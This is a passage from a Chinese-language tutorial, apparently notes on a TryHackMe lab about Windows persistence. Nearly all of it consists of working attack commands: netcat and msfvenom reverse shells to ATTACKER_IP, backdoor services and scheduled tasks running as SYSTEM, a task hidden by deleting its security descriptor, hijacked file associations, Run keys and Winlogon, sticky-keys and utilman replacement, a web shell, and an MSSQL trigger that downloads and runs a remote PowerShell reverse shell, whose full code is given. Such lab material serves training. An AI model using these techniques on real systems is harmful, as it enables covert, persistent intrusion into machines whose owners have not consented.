class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ nc -lvp 4445</span><br></pre></td></tr></table></figure><p>如果您双击该快捷方式，您应该会重新连接到攻击者的计算机。同时，用户将获得他们所期望的计算器。您可能会注意到命令提示符在屏幕上闪烁并立即消失。希望普通用户不会太介意这一点。</p><ul><li><strong>劫持文件关联</strong></li></ul><p>除了通过可执行文件或快捷方式进行持久保存之外，我们还可以劫持任何文件关联，以强制操作系统在用户打开特定文件类型时运行 shell。</p><p>默认操作系统文件关联保存在注册表中，其中以下路径<code>HKLM\Software\Classes\</code>每个文件类型存储一个键。假设我们想检查哪个程序用于打开 .txt 文件；我们可以直接检查<code>.txt</code>子键并找到与其关联的<strong>程序 ID (ProgID)</strong> 。ProgID 只是系统上安装的程序的标识符。对于 .txt 文件，我们将获得以下 ProgID：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3ae1b8356b38a349090e836026d6d480.png" alt="注册表中的文件扩展名"></p><p>然后，我们可以搜索相应 ProgID 的子项（也在 下<code>HKLM\Software\Classes\</code>），在本例中为  <code>txtfile</code>，我们将在其中找到对负责处理 .txt 文件的程序的引用。大多数 ProgID 条目都会有一个子项，在该子项下<code>shell\open\command</code>指定了针对具有该扩展名的文件运行的默认命令：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c3565cf93de4990f41f41b25aed80571.png" alt="注册表中的 ProgID"></p><p>在这种情况下，当你尝试打开 .txt 文件时，系统将执行<code>%SystemRoot%\system32\NOTEPAD.EXE %1</code>，其中<code>%1</code>代表打开的文件的名称。如果我们想劫持此扩展，我们可以用执行后门的脚本替换该命令，然后照常打开文件。首先，让我们创建一个具有以下内容的 ps1 脚本并将其保存到<code>C:\Windows\backdoor2.ps1</code>：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> <span class="literal">-NoNewWindow</span> <span class="string">&quot;c:\tools\nc64.exe&quot;</span> <span class="string">&quot;-e cmd.exe ATTACKER_IP 4448&quot;</span></span><br><span class="line">C:\Windows\system32\NOTEPAD.EXE <span class="variable">$args</span>[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>请注意，在 Powershell 中，我们必须传递<code>$args[0]</code>给记事本，因为它将包含要打开的文件的名称，如通过 给出的那样<code>%1</code>。</p><p>现在让我们更改注册表项以在隐藏窗口中运行我们的后门脚本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-WindowStyle</span> <span class="keyword">hidden</span> C:\Windows\System32\backdoor2.ps1 %<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f7ed25a701cf20ea85cf333b20708ffe.png" alt="后门 ProgID"></p><p>最后，为你的反向 shell 创建一个监听器，并尝试打开受害者机器上的任何 .txt 文件（如果需要，创建一个）。你应该会收到一个具有打开文件的用户权限的反向 shell。</p><h4 id="滥用服务">滥用服务</h4><p>Windows 服务提供了一种很好的建立持久性的方法，因为它们可以配置为在受害计算机启动时在后台运行。如果我们可以利用任何服务为我们运行某些东西，那么每次启动受害计算机时，我们都可以重新获得对受害计算机的控制权。</p><p>服务基本上是在后台运行的可执行文件。配置服务时，您可以定义要使用的可执行文件，并选择服务是在计算机启动时自动运行还是应手动启动。</p><p>我们可以通过两种主要方式滥用服务来建立持久性：创建新服务或修改现有服务以执行我们的有效载荷。</p><ul><li><strong>创建后门服务</strong></li></ul><p>可以使用以下命令创建并启动名为“THMservice”的服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe create THMservice binPath= <span class="string">&quot;net user Administrator Passwd123&quot;</span> <span class="built_in">start</span>= auto</span><br><span class="line">sc.exe <span class="built_in">start</span> THMservice</span><br></pre></td></tr></table></figure><blockquote><p>每个等号后面必须有一个空格才能使命令起作用</p></blockquote><p>服务启动时将执行“net user”命令，将管理员密码重置为<code>Passwd123</code>。请注意，服务已设置为自动启动（start= auto），这样它无需用户交互即可运行。</p><p>重置用户密码已经足够好了，但我们也可以用 msfvenom 创建反向 shell，并将其与创建的服务关联起来。但请注意，服务可执行文件是唯一的，因为它们需要实现系统处理的特定协议。如果要创建与 Windows 服务兼容的可执行文件，可以使用msfvenom 中的格式<code>exe-service</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe</span><br></pre></td></tr></table></figure><p>将可执行文件复制到目标系统，并将<code>C:\Windows</code>服务的 binPath 指向它</p><blockquote><p>windows可使用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WebRequest</span> &lt;ip:port&gt; <span class="literal">-OutFile</span> &lt;path&gt;</span><br></pre></td></tr></table></figure><p>下载文件，等同于<code>wget</code></p></blockquote><ul><li><strong>修改现有服务</strong></li></ul><p>虽然创建新服务以实现持久性效果很好，但蓝队可能会监控整个网络的新服务创建。我们可能希望重用现有服务，而不是创建一个服务以避免被发现。通常，任何禁用的服务都是不错的选择，因为它可以在用户不知情的情况下被更改。</p><p>您可以使用以下命令获取可用服务的列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe query state=all</span><br></pre></td></tr></table></figure><p>在靶机中找到一个名为 THMService3 的已停止服务。要查询该服务的配置，您可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe qc THMService3</span><br></pre></td></tr></table></figure><p>在使用服务实现持久性时，我们关心三件事：</p><ul><li>可执行文件（<strong>BINARY_PATH_NAME</strong>）应该指向我们的有效载荷。</li><li>服务<strong>START_TYPE</strong>应该是自动的，以便有效载荷无需用户交互即可运行。</li><li>SERVICE_START_NAME是服务运行的帐户，最好设置为<strong>LocalSystem****以</strong>获取 SYSTEM 权限。</li></ul><p>让我们首先使用 msfvenom 创建一个新的反向 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe</span><br></pre></td></tr></table></figure><p>重新配置“THMservice3”参数，我们可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe config THMservice3 binPath= &quot;C:\Windows\rev-svc2.exe&quot; start= auto obj= &quot;LocalSystem&quot;</span><br></pre></td></tr></table></figure><h4 id="滥用计划任务"><strong>滥用计划任务</strong></h4><ul><li><strong>任务计划程序</strong></li></ul><p>安排任务的最常见方式是使用内置的<strong>Windows 任务计划程序</strong>。任务计划程序允许对任务的启动时间进行精细控制，允许您配置在特定时间激活、定期重复甚至在发生特定系统事件时触发的任务。从命令行，您可以使用与任务计划程序进行交互。可以在<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks">Microsoft 网站</a>上找到<code>schtasks</code>该命令的完整参考。</p><p>让我们创建一个每分钟运行一次反向 shell 的任务。在现实渗透中，往往不需要如此频繁</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; schtasks /create /<span class="built_in">sc</span> minute /mo <span class="number">1</span> /tn THM<span class="literal">-TaskBackdoor</span> /tr <span class="string">&quot;c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449&quot;</span> /ru SYSTEM</span><br><span class="line">SUCCESS: The scheduled task <span class="string">&quot;THM-TaskBackdoor&quot;</span> has successfully been created.</span><br></pre></td></tr></table></figure><p>上面的命令将创建一个“THM-TaskBackdoor”任务并执行 <code>nc64</code>反向 shell 返回给攻击者。<code>/sc</code>和<code>/mo</code>选项表示该任务应每分钟运行一次。<code>/ru</code>选项表示该任务将以 SYSTEM 权限运行。</p><p>要检查我们的任务是否已成功创建，我们可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /tn thm-taskbackdoor</span><br></pre></td></tr></table></figure><ul><li><strong>使任务不可见</strong></li></ul><p>如果受感染的用户试图列出其计划任务，我们的后门就会被发现。为了进一步隐藏我们的计划任务，我们可以通过删除其**安全描述符 (SD)**使其对系统中的任何用户不可见。安全描述符只是一个 ACL，它说明哪些用户可以访问计划任务。如果您的用户无权查询计划任务，您将无法再看到它，因为 Windows 只会显示您有权使用的任务。删除 SD 相当于禁止所有用户访问计划任务，包括管理员。</p><p>所有计划任务的安全描述符都存储在 中<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\</code>。您将为每个任务找到一个注册表项，该项下名为“SD”的值包含安全描述符。只有拥有 SYSTEM 权限才能删除该值。</p><p>为了隐藏我们的任务，让我们删除之前创建的“THM-TaskBackdoor”任务的 SD 值。为此，我们将使用<code>psexec</code>以 SYSTEM 权限打开 Regedit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\tools\pstools\PsExec64.exe -s -i regedit</span><br></pre></td></tr></table></figure><p>然后我们将删除我们任务的安全描述符：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9a6dad473b19be313e3069da0a2fc937.png" alt="任务计划程序"></p><p>如果我们再次尝试查询我们的服务，系统会告诉我们没有这样的任务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; schtasks /query /tn thm-taskbackdoor </span><br><span class="line">ERROR: The system cannot find the file specified.</span><br></pre></td></tr></table></figure><h4 id="登录触发持久性">登录触发持久性</h4><p>用户执行的某些操作也可能与执行特定有效负载绑定以实现持久性。Windows 操作系统提供了几种将有效负载与特定交互关联起来的方法。此任务将研究植入将在用户登录系统时执行的有效负载的方法。</p><ul><li><strong>启动文件夹</strong></li></ul><p>每个用户都有一个文件夹<code>C:\Users\&lt;your_username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>，您可以在其中放置可执行文件，以便在用户登录时运行。攻击者只需在其中放置有效载荷即可实现持久性。请注意，每个用户只会运行其文件夹中可用的任何内容。</p><p>如果我们想强制所有用户在登录时运行有效负载，我们可以以相同的方式使用下面的文件夹<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> 。</p><p>使用 msfvenom 生成一个反向 shell payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe</span><br></pre></td></tr></table></figure><p>将有效载荷复制到受害机器中，将有效载荷存储到<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>文件夹中，以便任何登录机器的用户都可以获得一个 shell。</p><ul><li><strong>运行/运行一次</strong></li></ul><p>通过注册表强制用户在登录时执行程序。您可以使用以下注册表项来指定登录时要运行的应用程序，而不是将有效负载传递到特定目录中：</p><ul><li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code></li><li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li><li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code></li><li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li></ul><p><code>HKCU</code>下的注册表项仅适用于当前用户，<code>HKLM</code>下的注册表项适用于所有人。<code>Run</code>键下指定的任何程序将在用户每次登录时运行。<code>RunOnce</code>键下指定的程序只会执行一次。</p><p>用 msfvenom 创建一个新的反向 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe</span><br></pre></td></tr></table></figure><p>将其传输到受害机器后，让我们将其移动到<code>C:\Windows\</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; move revshell.exe C:\Windows</span><br></pre></td></tr></table></figure><p>然后我们在<code>REG_EXPAND_SZ</code>下创建一个注册表项<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code>。该项的名称可以是任何你喜欢的名称，其值将是我们要执行的命令。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c99038cd6cc9e37512edabb1f873a4da.png" alt="后门运行入口"></p><p>完成此操作后，退出当前会话并重新登录，收到shell</p><ul><li><strong>操作系统</strong></li></ul><p>登录时自动启动程序的另一种方法是滥用 Winlogon，它是在身份验证后立即加载用户配置文件的 Windows 组件（以及其它功能）。</p><p>Winlogon 使用下面的一些注册表项<code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code>来获得持久性：</p><ul><li><code>Userinit</code>指向<code>userinit.exe</code>，它负责恢复您的用户配置文件偏好设置。</li><li><code>shell</code>指向系统的shell，通常是<code>explorer.exe</code>。</li></ul><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f3c2215af6e3f2d19313498fca62a9d4.png" alt="Winlogon 注册表"></p><p>如果我们用某个反向 shell 替换任何可执行文件，我们就会破坏登录顺序，而这并不是我们所希望的。有趣的是，您可以附加用逗号分隔的命令，Winlogon 将处理所有这些命令。</p><p>我们将像之前一样将 shell 传输到受害机器。然后我们可以将 shell 复制到我们喜欢的任何目录。然后我们在 中改变<code>shell</code>或<code>Userinit</code>。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dc5fa3e75ff056f11e16c03373799f45.png" alt="存在后门的 userinit"></p><ul><li><strong>登陆脚本</strong></li></ul><p>加载用户配置文件时要做的事情之一是<code>userinit.exe</code>检查名为<code>UserInitMprLogonScript</code>的环境变量。我们可以使用此环境变量为用户分配登录脚本，该脚本将在登录计算机时运行。默认情况下未设置该变量，因此我们可以创建它并分配我们喜欢的任何脚本。</p><p>请注意，每个用户都有自己的环境变量；因此，您需要分别对每个用户进行后门处理。</p><p>首先创建一个用于此技术的反向shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move revshell.exe C:\Windows</span><br></pre></td></tr></table></figure><p>要为用户创建环境变量，您可以转到<code>HKCU\Environment</code>注册表中的环境变量。我们将使用该<code>UserInitMprLogonScript</code>条目指向我们的有效负载，以便在用户登录时加载它：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9ce41ee1fc282b8dcacd757b23417b12.png" alt="后门环境"></p><p>请注意，此注册表项在<code>HKLM</code>中没有等效项，这使得您的后门仅适用于当前用户。</p><h4 id="对login-screen-rdp进行后门攻击">对login screen/RDP进行后门攻击</h4><p>如果我们可以物理访问该机器（或在我们的例子中是RDP），则可以对登录屏幕进行后门操作以访问终端，而无需拥有机器的有效凭据。</p><ul><li><strong>粘滞键</strong></li></ul><p>当按下<code>CTRL + ALT + DEL</code>等组合键时，您可以将 Windows 配置为使用粘滞键，这样您就可以按顺序按下组合键，而不是同时按下。</p><p>为了使用粘滞键建立持久性，我们将滥用 Windows 安装中默认启用的快捷方式，该快捷方式允许我们按<code>SHIFT</code>5 次即可激活粘滞键。输入快捷方式后，我们通常会看到如下所示的屏幕：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/27e711818bea549ace3cf85279f339c8.png" alt="粘滞键"></p><p>按<code>SHIFT</code>5 次后，Windows 将执行 中的二进制文件<code>C:\Windows\System32\sethc.exe</code>。如果我们能够将此类二进制文件替换为我们喜欢的有效载荷，那么我们就可以使用快捷方式触发它。有趣的是，我们甚至可以在输入任何凭据之前从登录屏幕执行此操作。</p><p>一个直接对登录屏幕进行后门操作的方法是将其替换<code>sethc.exe</code> 为<code>cmd.exe</code>的副本。这样，我们就可以使用粘滞键快捷方式生成控制台，甚至可以从登录屏幕生成控制台。</p><p>要覆盖<code>sethc.exe</code>，我们首先需要取得文件的所有权并授予当前用户修改它的权限。只有这样，我们才能用<code>cmd.exe</code>的副本替换它。我们可以使用以下命令执行此操作：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; takeown /f c:\Windows\System32\sethc.exe</span><br><span class="line"></span><br><span class="line">SUCCESS: The file (or folder): <span class="string">&quot;c:\Windows\System32\sethc.exe&quot;</span> now owned by user <span class="string">&quot;WPERSISTENCE\Administrator&quot;</span>.</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; icacls C:\Windows\System32\sethc.exe /grant Administrator:F</span><br><span class="line">processed file: C:\Windows\System32\sethc.exe</span><br><span class="line">Successfully processed <span class="number">1</span> files; Failed processing <span class="number">0</span> files</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">copy</span> c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe</span><br></pre></td></tr></table></figure><p>完成此操作后，从开始菜单锁定您的会话：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2faf2bec5763297beb7c921858900c57.png" alt="锁定会话"></p><p>您现在应该能够按<code>SHIFT</code>五次直接从登录屏幕访问具有 SYSTEM 权限的终端：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5062148957ec1d70dccd080bdca93ddf.png" alt="sethc 后门"></p><ul><li><strong>Utilman</strong></li></ul><p>此部分和提权阶段相同</p><p>Utilman 是一个内置的 Windows 应用程序，用于在锁定屏幕期间提供轻松访问选项：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/73c7698a015de5a988fd815ff3e41473.png" alt="实用工具"></p><p>当我们点击登录屏幕上的轻松访问按钮时，它会以 SYSTEM 权限执行<code>C:\Windows\System32\Utilman.exe</code>。如果我们用 的副本替换它<code>cmd.exe</code>，我们就可以再次绕过登录屏幕。</p><p>为了替换<code>utilman.exe</code>，我们执行与 类似的过程<code>sethc.exe</code>：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; takeown /f c:\Windows\System32\utilman.exe</span><br><span class="line"></span><br><span class="line">SUCCESS: The file (or folder): <span class="string">&quot;c:\Windows\System32\utilman.exe&quot;</span> now owned by user <span class="string">&quot;PURECHAOS\Administrator&quot;</span>.</span><br><span class="line"></span><br><span class="line">C:\&gt; icacls C:\Windows\System32\utilman.exe /grant Administrator:F</span><br><span class="line">processed file: C:\Windows\System32\utilman.exe</span><br><span class="line">Successfully processed <span class="number">1</span> files; Failed processing <span class="number">0</span> files</span><br><span class="line"></span><br><span class="line">C:\&gt; <span class="built_in">copy</span> c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe</span><br><span class="line">Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes</span><br><span class="line">        <span class="number">1</span> file(s) copied.</span><br></pre></td></tr></table></figure><p>为了触发我们的终端，我们将从开始按钮锁定屏幕：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1f94b28361ffebbf70d280755821bc12.png" alt="锁定会话"></p><p>最后，继续单击“轻松访问”按钮。由于我们替换了<code>utilman.exe</code>副本<code>cmd.exe</code>，我们将获得具有 SYSTEM 权限的命令提示符：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0fe1901296108241e2700abf87fa6a27.png" alt="后门实用程序"></p><h4 id="使用现有服务">使用现有服务</h4><p>如果您不想使用 Windows 功能来隐藏后门，您可以随时利用任何可用于为您运行代码的现有服务。此任务将研究如何在典型的 Web 服务器设置中植入后门。不过，任何其他您可以在一定程度上控制执行内容的应用程序都应该可以类似地植入后门。可能性是无穷无尽的！</p><ul><li><strong>使用WebShell</strong></li></ul><p>在 Web 服务器中实现持久性的常用方法是将 Web Shell 上传到 Web 目录。这很简单，将授予我们 IIS 中配置用户的权限，默认情况下为<code>iis apppool\defaultapppool</code>。即使这是一个非特权用户，它也具有特殊的<code>SeImpersonatePrivilege</code>，提供了一种使用各种已知漏洞轻松升级到管理员权限的方法。</p><blockquote><p>此处涉及的提权方法可参考Windows提权</p></blockquote><p>首先下载一个 <a href="http://ASP.NET">ASP.NET</a> web shell。 <a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx">此处</a>提供了一个现成的 web shell ，但您可以随意使用您喜欢的任何 web shell。将其传输到受害者机器并将其移动到 webroot 中，默认情况下位于以下<code>C:\inetpub\wwwroot</code>目录中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; move shell.aspx C:\inetpub\wwwroot\</span><br></pre></td></tr></table></figure><blockquote><p>根据您创建/传输 的方式 <code>shell.aspx</code>，文件中的权限可能不允许 Web 服务器访问它。如果您在访问 shell 的 URL 时收到“权限被拒绝”错误，只需授予每个人对文件的完整权限即可使其正常工作。您可以使用<code>icacls shell.aspx /grant Everyone:F</code>来执行此操作。</p></blockquote><ul><li><strong>利用MSSQL触发器作为后门</strong></li></ul><p>MSSQL 中的<strong>触发器</strong>允许您绑定在数据库中发生特定事件时要执行的操作。这些事件的范围可以从用户登录到从给定表插入、更新或删除数据。对于此任务，我们将为数据库中的任何 INSERT 操作创建一个触发器<code>HRDB</code>。</p><p>在创建触发器之前，我们必须先在数据库上重新配置一些东西。首先，我们需要启用<code>xp_cmdshell</code>存储过程。<code>xp_cmdshell</code>是任何 MSSQL 安装中默认提供的存储过程，允许您直接在系统的控制台中运行命令，但默认情况下处于禁用状态。</p><p>启用<code>Microsoft SQL Server Management Studio 18</code>，当要求进行身份验证时，只需使用<strong>Windows 身份验证</strong>（默认值），您将使用当前 Windows 用户的凭据登录。默认情况下，本地管理员帐户将有权访问所有数据库。</p><p>登录后，单击**“新建查询”**按钮打开查询编辑器：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/eb3aaca1ed1da7d1e08f0c3069a5633a.png" alt="新的 SQL 查询"></p><p>运行以下SQL语句，启用MSSQL配置中的“高级选项”，并继续启用<code>xp_cmdshell</code>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sp_configure <span class="string">&#x27;Show Advanced Options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p>此后，我们必须确保任何访问数据库的网站都可以运行<code>xp_cmdshell</code>。默认情况下，只有具有<code>sysadmin</code>角色的数据库用户才能执行此操作。由于预计 Web 应用程序将使用受限数据库用户，因此我们可以向所有用户授予权限以模拟该<code>sa</code>用户，即默认数据库管理员：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">USE master</span><br><span class="line"></span><br><span class="line"><span class="keyword">GRANT</span> IMPERSONATE <span class="keyword">ON</span> LOGIN::sa <span class="keyword">to</span> [Public];</span><br></pre></td></tr></table></figure><p>完成所有这些后，我们终于配置了一个触发器。我们首先切换到数据库<code>HRDB</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE HRDB</span><br></pre></td></tr></table></figure><p>我们的触发器将利用<code>xp_cmdshell</code>执行 Powershell 从攻击者控制的 Web 服务器下载并运行<code>.ps1</code>文件。触发器将配置为 在数据库表<code>INSERT</code>中创建以下内容时执行：<code>Employees``HRDB</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> [sql_backdoor]</span><br><span class="line"><span class="keyword">ON</span> HRDB.dbo.Employees </span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">INSERT</span> <span class="keyword">AS</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span></span><br><span class="line"><span class="keyword">EXEC</span> master..xp_cmdshell <span class="string">&#x27;Powershell -c &quot;IEX(New-Object net.webclient).downloadstring(&#x27;&#x27;http://ATTACKER_IP:8000/evilscript.ps1&#x27;&#x27;)&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>现在后门已经设置好了，让<code>evilscript.ps1</code>我们在攻击者的机器中创建一个包含 Powershell 反向 shell 的机器：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;ATTACKER_IP&quot;</span>,<span class="number">4454</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();</span><br><span class="line">[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);</span><br><span class="line">    <span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );</span><br><span class="line">    <span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span>;</span><br><span class="line">    <span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);</span><br><span class="line">    <span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);</span><br><span class="line">    <span class="variable">$stream</span>.Flush()</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure><p>我们需要打开两个终端来处理此漏洞涉及的连接：</p><ul><li>触发器将执行第一个连接以下载并执行<code>evilscript.ps1</code>。我们的触发器为此使用端口 8000。</li><li>第二个连接将是端口 4454 上的反向 shell，返回到我们的攻击者机器。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4454</span><br></pre></td></tr></table></figure><h4 id="ad域控">AD域控</h4><h5 id="基础知识">基础知识</h5><p>Microsoft 